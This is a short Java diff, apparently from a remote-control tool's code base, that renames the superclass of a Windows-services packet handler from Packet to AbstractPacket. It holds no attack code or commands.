@@ -4,7 +4,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlServices;
 
-public class PacketWINSER extends Packet {
+public class PacketWINSER extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
